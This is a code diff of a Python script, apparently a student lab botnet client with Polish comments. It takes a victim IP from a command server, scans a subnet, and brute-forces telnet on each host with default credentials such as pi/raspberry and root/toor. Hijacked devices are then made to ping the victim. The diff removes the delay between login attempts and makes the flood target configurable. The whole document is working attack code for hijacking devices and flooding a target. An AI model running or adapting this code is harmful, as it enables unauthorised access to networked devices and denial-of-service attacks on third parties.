@@ -11,12 +11,12 @@ attack = False
 def telnetConnect(ip_address, victimIP, attackType: int):
     # można zrobić pętlę do wczytywania user credentials z pliku
     users = ['pi', 'admin', 'root', 'user', '1234', 'administrator']
-    passwords = ['1234', 'toor', 'admin', 'root', 'user', 'raspberry']
-
+    passwords = ['1234', 'toor', 'admin', 'Ciumcium', 'root', 'user', 'raspberry']
+    #print("telnet works")
     for user in users:
-        # print('connecting with login: ' + user)
+        print('connecting with login: ' + user)
         for password in passwords:
-            time.sleep(10)
+            #time.sleep(10)
             if not attack:
                 print("telnet return")
 
@@ -25,10 +25,10 @@ def telnetConnect(ip_address, victimIP, attackType: int):
 
             except:
                 # if ip_addres does not respond return
-                # print("host not responding")
+                print(ip_address+" not responding")
                 return
 
-            # print(' and passwd: ' + password)
+            print(' and passwd: ' + password)
             try:
                 tn.read_until(b"login: ")
                 tn.write(user.encode('ascii') + b"\n")
@@ -42,7 +42,8 @@ def telnetConnect(ip_address, victimIP, attackType: int):
 
             if attackType == 1:  # note
                 print('pingujemy..')
-                tn.write(b"ping 192.168.100.7\n")  # można zrobić wątki
+                tn.write(b"ping " + str(victimIP).encode('ascii') + b"\n")  # można zrobić wątki
+                #tn.write(b"ping 192.168.100.19 \n")
                 if not attack:  # tu też
                     print("stopping attack")
                     return
@@ -91,13 +92,13 @@ def checkForOtherDevices(ip, victimIP):
     g = ip.split('.')[-1]
     ip = ip[:l - len(g)]
     print('connecting to telnet...')
-
-    while x < 254:
+    #start_new_thread(telnetConnect, ("192.168.100.8", victimIP, 1))
+    while x < 20:
         if not attack:
             return
         current_address = ip + str(x)
         # próbuj połączyć z każdym przez telnet
-        # print(current_address)
+        print(current_address)
         start_new_thread(telnetConnect, (current_address, victimIP, 1))
         x += 1
 
@@ -106,8 +107,8 @@ def checkForOtherDevices(ip, victimIP):
 
 if __name__ == '__main__':
 
-    #HOST = '192.168.100.11'  # The server's hostname or IP address
-    HOST = '127.0.0.1'
+    # HOST = '192.168.100.11'  # The server's hostname or IP address
+    HOST = '192.168.100.19'
     PORT = 65432  # The port used by the server
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -127,7 +128,7 @@ if __name__ == '__main__':
                     s.send('1'.encode())
                     connected = 1
                 except:
-                    print("couldn't connect to: "+HOST)
+                    print("couldn't connect to: " + HOST)
                     s.close()
                     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     connected = 0
@@ -140,8 +141,9 @@ if __name__ == '__main__':
                 if str(data) == '1':
                     victim_ip = str(s.recv(16).decode())
                     print('victim address:' + str(victim_ip))
-                    checkForOtherDevices(HOST, victim_ip)
                     attack = True
+                    checkForOtherDevices(HOST, victim_ip)
+
                 else:
                     print('something went wrong')
                 # todo:zrobić try zeby sie nie wywalilo
